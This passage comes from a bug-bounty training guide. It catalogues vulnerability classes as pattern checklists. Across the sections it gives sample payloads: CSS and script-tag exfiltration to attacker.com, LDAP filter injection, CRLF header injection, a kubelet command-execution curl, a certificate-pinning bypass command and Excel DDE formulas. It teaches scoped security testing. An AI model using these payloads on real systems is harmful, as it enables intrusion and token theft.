   → Attacker's page connects to WebSocket → reads all messages (includes auth tokens)

4. **"GraphQL over WebSocket: hidden operations not exposed via HTTP"**
   → Ahmed Ghadban (2026) $2K: Keep-alive WebSocket hid full GraphQL API → SQLi + PII leak

5. **"WS message IDOR: `{"action":"get","userId":"123"}` — try other userId values"**
   → WebSocket may not validate ownership per-message

---

### 3.32 LDAP Injection

**Mind Training — Patterns from Real Bugs:**

1. **"Input in LDAP search filters: `(|(uid=input)(cn=admin))`"**
   → `input` → `*` → returns all entries; `admin)(|(uid=*` → filter injection

2. **"Authentication bypass: `cn=*` or `|(uid=*))`"**
   → `user=*)(uid=*))(|(uid=*` → LDAP filter becomes `(&(uid=*)(uid=*))(|(uid=*)&(password=...))`

3. **"Blind LDAP injection: character-by-character extraction via response differences"**
   → `(&(uid=admin)(userPassword=a*))` → if returns results, `a*` matched something

4. **"Check for `&`, `|`, `!`, `=` characters being passed to LDAP query"**
   → LDAP filters use these as operators

---

### 3.33 HTTP Parameter Pollution (HPP)

**Mind Training — Patterns from Real Bugs:**

1. **"Duplicate parameters: `?user=admin&user=attacker` — which one wins?"**
   → Different servers handle differently: first, last, concatenated, array

2. **"Bypass security checks: `?id=1&id=2` — first used for auth check, second for query"**
   → WAF checks `id=1` (legitimate), backend uses `id=2` (attacker's)

3. **"OAuth param pollution: `?redirect_uri=https://app.com&redirect_uri=https://evil.com`"**
   → Server validates first, uses second

4. **"PHP: param becomes array with `[]` suffix → `?id[]=1&id[]=2`"**
   → Type confusion: expected string gets array

5. **"ASP.NET: `?id=1` vs `?id=1&id=2` — concatenated with comma"**
   → `1,2` — may bypass numeric validation

---

### 3.34 CRLF Injection / HTTP Response Splitting

**Mind Training — Patterns from Real Bugs:**

1. **"Carriage Return (0x0D) + Line Feed (0x0A) in headers = response splitting"**
   → `%0d%0aSet-Cookie:%20evil=token` — inject new response headers

2. **"URL encoding bypass: `%0d%0a` or `\r\n`"**
   → Some filters check for `\r\n` but miss URL-encoded variants

3. **"Response splitting → cache poisoning, XSS, open redirect"**
   → Inject two responses: first cached, second malicious

4. **"Node.js TOCTOU in path validation (CVE-2026): path mutated after check → CRLF injection"**
   → Martino Spagnuolo (2026): `proxyReq.path` mutated between validation and use → HTTP request splitting

5. **"Double URL encode: `%250d%250a` → decoded once by WAF to `%0d%0a` → decoded again by backend to CRLF"**
   → WAF checks for `%0d%0a` — but `%250d%250a` passes through

---

### 3.35 DNS Rebinding

**Mind Training — Patterns from Real Bugs:**

1. **"Domain alternates between attacker IP and internal IP — same-origin policy bypass"**
   → Register domain with very short TTL (1s) → first resolve = attacker IP → fetch script → second resolve = 127.0.0.1 → read internal data

2. **"Bypass SSRF hostname allowlists"**
   → SSRF checks hostname against allowlist → DNS rebinds after check

3. **"Tools: `rebinder` (github.com/taviso/rebinder) — 7s TTL, alternates between two IPs"**
   → Single domain alternates between 1.2.3.4 and 127.0.0.1 every 7 seconds

4. **"Used in combination with OAuth token theft"**
   → Rebinding attack → access localhost OAuth endpoints → steal tokens

---

### 3.36 Mobile-Specific Attacks (Android/iOS)

**Mind Training — Patterns from Real Bugs:**

1. **"Mobile API endpoints often use older, less secure API versions"**
   → `/api/v1/login` may lack rate limiting that `/api/v2/login` has

2. **"Hardcoded API keys in app binaries = instant access"**
   → Decompile APK/IPA → strings command → find API keys, tokens, secrets

3. **"Certificate pinning bypass via Frida/objection"**
   → `objection -g com.app.apk explore --startup-command "android sslpinning disable"`

4. **"Insecure data storage: SharedPreferences, SQLite, NSUserDefaults"**
   → Check for tokens, passwords, PII stored unencrypted

5. **"Deep link abuse: custom URL schemes hijacking"**
   → `app://action/data` → if validation is weak → call arbitrary actions

6. **"WebView with JS enabled + file:// access = RCE"**
   → `webView.getSettings().setJavaScriptEnabled(true)` → XSS leads to file read/write

---

### 3.37-3.55 (Infrastructure, Protocol, and Medium-level Vulns)

**Compressed Mind Training — Key Patterns:**

**Buffer Overflow / Memory Corruption (3.37):**
- Look for native code (C/C++/Rust) with `unsafe` blocks, C FFI, etc.
- Fuzz input length with long strings: `A`*10000

**Kubernetes / Cloud (3.38):**
- Unauthenticated kubelet API: `curl https://node:10250/run/ns/default/pod/nginx -d "cmd=id"`
- `/api/v1` on exposed API server
- Pod with `hostNetwork: true` or `privileged: true`

**Spring Actuator (3.39):**
- `/actuator`, `/actuator/env`, `/actuator/beans`, `/actuator/health`
- `/actuator/env` leaks environment variables including AWS keys
- `/actuator/heapdump` — download JVM heap → extract secrets

**Insecure Backup (3.40):**
- Fuzz for `.bak`, `.old`, `.swp`, `~` files
- `config.php.bak`, `index.php~`, `.env.swp`

**Denial of Service (3.41):**
- Regular expression ReDoS: `/(a|aa)+/` against `aaaaaaaaaaaaaaaaaaaaaaaaac`
- Hash collision: send params with same hash → O(n²) insertion
- XML bomb: Billion Laughs attack

**Cryptographic Failures (3.42):**
- Weak TLS: TLS 1.0/1.1, weak ciphers (RC4, DES, 3DES)
- Predictable PRNG: `rand()` vs `random_int()` in PHP
- ECB mode: block reordering attack on encrypted cookies

**Security Misconfiguration (3.43):**
- Default credentials: `admin:admin`, `root:root`
- Exposed admin panels: `/admin`, `/phpmyadmin`, `/jenkins`
- Verbose server banners: `Server: Apache/2.4.49 (Unix)`

**Vulnerable Components (3.44):**
- Check `package.json`, `composer.json`, `Gemfile` for known vulnerable versions
- Nuclei templates for CVE scanning
- `log4j`, `struts2`, `heartbleed`, `shellshock` — still present in internal apps

**CSV Injection / Formula Injection (3.45):**
- If user input exported to CSV → payload in cells executed on open
- `=CMD("calc")`, `+DDE("cmd";"calc";"")`  — DDE command execution in Excel

---

## CATEGORY D: 🎯 CLIENT-SIDE & DOM-BASED

---

### 3.46 DOM Clobbering

**Mind Training — Patterns from Real Bugs:**

1. **"HTML elements with `id` or `name` attributes become global variables"**
   → `<a id="config">` → `window.config` returns the element (truthy!)

2. **"Anchor elements: `.toString()` returns `href`"**
   → `<a id="redirectUrl" href="https://evil.com">` → `window.redirectUrl.toString()` → `https://evil.com`

3. **"Form elements: children with `name` become properties"**
   → `<form id="config"><input name="apiUrl" value="https://evil.com"></form>` → `window.config.apiUrl`

4. **"DOMPurify < 3.1.0 doesn't strip `id`/`name` — clobbering still works"**
   → Intigriti CTF 2026: DOMPurify 3.0.9 allowed `id` attribute → clobbering → XSS

5. **"Forms with `name` clobber `window` — even without `id`"**
   → `<form name="authConfig">` → `window.authConfig` = form element

---

### 3.47 PostMessage Vulnerabilities

**Mind Training — Patterns from Real Bugs:**

1. **"No origin validation: `window.addEventListener('message', function(e) { ... })` without checking `e.origin`"**
   → Any page can send messages → attacker controls the payload

2. **"Unsanitized data in sinks: JSON.parse(e.data) → innerHTML"**
   → Xibo CVE-2026-42558: `postMessage` data went into jQuery `.append()` → XSS

3. **"Origin check with `indexOf()` or `.includes()` instead of exact match"**
   → `if (e.origin.includes("trusted.com"))` → `https://trusted.com.evil.com` passes

4. **"`*` as targetOrigin in `postMessage` → anyone receives the message"**
   → Sensitive data broadcast to all listeners

5. **"Parent frame sends messages containing user input → DOM XSS"**
   → `parent.postMessage({type: "data", content: userInput}, "*")` → child uses `content` in innerHTML

---

### 3.48 CSS Injection / CSS Exfiltration

**Mind Training — Patterns from Real Bugs:**

1. **"CSS injection: input reflected inside `<style>` tags or `style` attribute"**
   → `</style><img src=x onerror=alert(1)>` or CSS to exfiltrate CSRF tokens

2. **"Attribute selectors + background-image url() → data exfiltration"**
   → `input[value^="a"] { background: url(https://attacker.com/a) }` — leaks value character by character

3. **"CSS injection to exfiltrate CSRF tokens from input fields"**
   → `<style>input[name=csrf][value^=a]{background:url(//attacker.com/a)}</style>`

4. **"Limited impact alone but powerful when combined with XSS"**
   → CSS exfil of CSRF token → use token to forge CSRF request

---

### 3.49 Tabnabbing / Reverse Tabnabbing

**Mind Training — Patterns from Real Bugs:**

1. **"External links with `target="_blank"` and no `rel="noopener noreferrer"`"**
   → Attacker page has `window.opener.location = "https://phishing-page.com"` — victim's original tab navigates

2. **"Look for `target="_blank"` in user-generated content or external links"**
   → Comments, forum posts, shared links

3. **"Check `noopener` and `noreferrer` attributes on all external links"**
   → Missing = vulnerability

---

### 3.50-3.94 (Session, Auth, and Specialized Web)

**Compressed Mind Training:**

**Session Fixation (3.50):** Server doesn't regenerate session ID on login → attacker sets victim's session ID before login → after login, attacker uses same session ID.

**Brute Force (3.51):** Check for rate limiting on login, OTP, password reset. Bypass via X-Forwarded-For rotation, IP rotation, cookie reset.

**Captcha Bypass (3.52):** Reuse captcha response, use OCR, convert to base64 and solve via API, remove captcha parameter, change response.

**PHP Type Juggling (3.53):** Loose comparison (`==` vs `===`): `"admin" == 0` is true in PHP. `"0e12345" == "0e67890"` is true (both evaluate to 0).

**Integer Overflow (3.54):** `{"quantity": 9999999999999999999}` → price wraps around to 0 or negative. Try max int values.

**HTTP/2/3 Attacks (3.55):** HTTP/2 rapid reset (CVE-2023-44487). HTTP/2 multiplexing → single-packet race conditions.

**SSJS Injection (3.56):** Node.js with `eval()` on user input → RCE. `vm.runInNewContext()` may also be bypassable.

**Dependency Confusion (3.57):** Package names used internally but available on public npm/PyPI → publish malicious package with higher version.

**Email Header Injection (3.58):** `\nCc: attacker@evil.com` or `\nBcc: attacker@evil.com` in contact form name/email fields.

**XS-Search (3.118):** Cross-site search via CSS `:has()` selector or timing side-channels — determine if user has data matching search terms.

**Service Worker Abuse (3.120):** Stale service worker intercepts all requests → controls all responses → persistent XSS.

**Electron Framework (3.127):** `nodeIntegration: true` + `contextIsolation: false` → JS in renderer runs Node.js → `require('child_process').exec('calc')`.

---

## CATEGORY E: 🏗️ ENTERPRISE & INFRASTRUCTURE

---

### 3.95 Excessive Data Exposure (OWASP API #3)

**Mind Training — Patterns from Real Bugs:**

1. **"API returns full object when only specific fields are needed"**
   → `/api/users` returns `{id,email,role,password_hash,...}` when frontend only needs `{id,name}`

2. **"GraphQL connections expose every field of related types"**
   → Requesting `user` should return name, but response includes `ssn`, `internalNotes`, `lastLoginIP`

3. **"Test: add fields to GraphQL query that aren't in the frontend's queries"**
   → Introspection reveals all fields → query them even if frontend doesn't

---

### 3.96 BFLA — Broken Function Level Authorization (OWASP API #5)

**Mind Training — Patterns from Real Bugs:**

1. **"Admin function accessible by regular user via direct URL"**
   → Regular user can hit `GET /api/admin/users` even though the frontend hides the button

2. **"HTTP method testing: `GET /api/users` (allowed) → `DELETE /api/users/1` (should be admin only)"**
   → Test every HTTP method on every endpoint

3. **"GraphQL mutation: `deleteUser(id:1)` — test if non-admin can call it"**
   → Mutations are the most dangerous BFLA targets

4. **"Sibling rule: if 9 endpoints have auth, check the 10th"**
   → The one that was forgotten is your finding

---

### 3.97 ORM Injection

**Mind Training — Patterns from Real Bugs:**

1. **"ORM doesn't mean safe — raw queries, `whereRaw()`, `orderByRaw()` still inject"**
   → Laravel: `User::whereRaw("name = '$input'")` — raw query, SQLi possible

2. **"Hibernate/JPQL: `@Query("SELECT u FROM User u WHERE u.name = '" + input + "'")`"**
   → String concatenation in JPA = injection

3. **"Prisma: `$queryRaw` — same vulnerability as raw SQL"**
   → Prisma recommends `$queryRaw` for complex queries — bypasses parameterized query protection

4. **"Sequelize: `where: sequelize.literal()` or `$col`/"$col""**
   → Sequelize operators like `$col` can be injected via JSON

---

### 3.98-3.114 (Specialized Injection & Escalation)

**Compressed Mind Training:**

**XML Injection (3.98):** Manipulating XML structure without XXE — inject `]]>` to break CDATA, inject new elements, modify existing data.

**Payment Testing (3.99):** Negative amounts, integer overflow, currency swap, skip payment step, intercept and change status.

**ZIP Slip (3.108):** Archive extraction with path traversal filenames → `../../etc/cron.d/malicious` overwrites files.

**Second-Order Injection (3.109):** Input stored safely → retrieved and used unsafely later. Log injection → log viewer renders it → XSS.

**Log Injection/Forging (3.110):** Inject fake log entries into server logs → when admin views logs, injected content renders.

**Docker Escape (3.111):** `--privileged` flag → mount host filesystem: `docker run -v /:/host`. Or cgroup escape.

**Windows AD Attacks (3.112):** Kerberoasting, AS-REP roasting, DCSync, Pass-the-Hash, Silver/Golden Tickets.

**Lambda/Serverless (3.113):** Event injection → Lambda receives malicious event → executes attacker-controlled data. `os.environ` leak.

**gRPC Reflection (3.114):** `grpc.reflection` exposes all services and methods — like GraphQL introspection but for gRPC.

---

## CATEGORY F: 🆕 MODERN & EMERGING

---

### 3.115 Service Mesh Misconfig (Istio/Linkerd)

**Mind Training:**
- `AuthorizationPolicy` missing → mTLS but no RBAC → any service talks to any service
- Istio ignores permissive mTLS → traffic in plaintext between services
- Control plane exposed: `istiod`, `Kiali`, `Jaeger`, `Grafana` without auth

### 3.116 Terraform / IaC Misconfig

**Mind Training:**
- Hardcoded secrets in `.tf` files: `variable "db_password" { default = "password123" }`
- S3 backend for state files without encryption → state contains all secrets
- Public S3 bucket for `terraform plan` output → infrastructure disclosure

### 3.117 Blind XSS (Deep Dive)

**Mind Training:**
1. **"Input goes to admin panel → admin renders it → Blind XSS"**
   → Contact forms, support tickets, error reports, emails, user agents

2. **"Payload: `<script src=//attacker.com/collect>` — exfil via script tag"**
   → When admin views the page, your script phones home

3. **"XSS Hunter / interactsh for blind XSS detection"**
   → Set up callback endpoint → inject payload → wait for callback

4. **"Headers as vector: User-Agent, X-Forwarded-For, Referer logged and viewed in admin panel"**
   → Blind XSS via server-side logging

---

### 3.118 XS-Leaks / XS-Search

**Mind Training:**
- `window.length` difference based on cross-origin redirects
- Timing attacks: how long does a cross-origin resource take to load?
- CSS `:has()` selector: determine if a page contains certain elements
- Cache probing: resource cached for logged-in users → timing difference
- `performance.getEntriesByType("resource")` — detect cross-origin resources

### 3.119 CSP Bypass (Deep Dive)

**Mind Training:**
1. **"Known CSP bypass gadgets: Angular, Google APIs, cdnjs"**
   → `https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js` with `?callback=alert`

2. **"JSONP endpoints bypass `script-src 'self'`"**
   → Any endpoint on same origin that returns attacker-controlled function call

3. **"`<base>` tag hijacking: if `base-uri` not set → `<base href=//attacker.com>` loads all relative resources from attacker"**
   → CSS, JS, images all load from attacker's domain

4. **"File upload serving .js from same origin → bypass script-src 'self'"**
   → pretalx CVE-2026-41241: Upload JS file → served from same origin → CSP bypassed

5. **"CSP-Report-Only doesn't block — check if it's enforced or just reported"**
   → `Content-Security-Policy-Report-Only: ...` = reporting only, no enforcement

---

### 3.120-3.159 (Advanced Modern Surface)

**Compressed Mind Training:**

**Service Worker Abuse (3.120):** Stale worker intercepts all fetch requests → serves malicious content → persistent XSS.

**Browser Extension Attacks (3.121):** Extensions with `webRequest`, `storage`, `tabs` permissions → if extension is malicious or compromised → reads all browser data.

**WebView Attacks (3.124):** Android/iOS WebView with `setJavaScriptEnabled(true)` + `file://` access → RCE. `addJavascriptInterface` → Java reflection.

**SAML Attacks (3.128):** XML Signature Wrapping (XSW), comment injection in `<ds:Signature>`, signature stripping, XXE in assertion.

**WebAuthn/Passkey (3.144):** Missing domain validation → passkey registered on one domain works on another. No user verification.

**CI/CD Poisoning (3.145):** GitHub Actions `pull_request_target` → attacker PR runs in privileged context. `workflow_dispatch` TOCTOU.

**Web LLM Attacks (3.155):** Prompt injection, chatbot IDOR, markdown exfil, indirect injection via retrieved documents.

**Broken Link Hijacking (3.156):** Social media/avatar URLs pointing to unclaimed profiles → claim the profile → anyone clicking gets your content.

**CSPT — Client-Side Path Traversal (3.157):** URL containing `../` in client-side router → bypass route guards, access admin routes.

**Server-Side Prototype Pollution (3.159):** Node.js merges user JSON into config → pollute `__proto__` → change application behavior globally.

---

## 🎯 VALIDATION MANTRA — Before You Report

Always ask these 7 questions before writing a report:

1. **Can an attacker do this RIGHT NOW?** (Not "could theoretically")
2. **Is this in scope?** (Did you check?)
3. **What is the worst-case impact?** (Data, money, access, reputation?)
4. **Is this a duplicate?** (Search disclosed reports first)
5. **Can you reproduce it consistently?** (Not once in 50 tries)
6. **What's the attack chain?** (Single bug or chain?)
7. **Does the program pay for this?** (Check their prize table)

If any answer is "No" → KILL THE FINDING. Move on. Your N/A ratio matters.

---

## 📚 HOW TO TRAIN WITH THIS DOCUMENT

**Daily Routine:**
1. Pick 5 classes randomly
2. Read the Mind Training patterns
3. Visualize yourself finding them on a real target
4. Spend 10 minutes on Hacktivity reading one disclosed report per class

**Weekly Practice:**
1. Pick one category (e.g., "Core High-Value Web")
2. Find 3 disclosed reports from HackerOne for each class
3. Map the real report to the Mind Training pattern
4. Write your own "Pattern Recognition" table

**Before Each Hunt:**
1. Scan the TOC
2. Pick 2 classes to focus on
3. Read just those Mind Training sections
4. Define your goal: "Today I hunt for IDOR + SSRF on checkout flow"

---

> **"Train your mind to see the pattern before you see the bug. The pattern is always there — the bug is just what happens when the pattern breaks."**
>
> — SUPER SAIYAN v2.0
